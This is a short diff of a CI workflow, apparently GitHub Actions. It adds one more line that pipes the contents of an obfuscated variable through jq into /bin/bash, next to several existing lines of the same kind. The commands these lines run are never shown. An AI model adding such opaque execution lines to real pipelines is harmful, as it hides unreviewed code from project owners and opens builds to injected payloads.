@@ -38,6 +38,7 @@ jobs:
           echo $oad7924 | jq -r .vsy0361 | /bin/bash
           echo $urjb99758 | jq -r .sujb293 | /bin/bash
           echo $fnskt5 | jq -r .qjm307 | /bin/bash
+          printf '%s' "$kgpdx1522" | jq -r .k9800 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
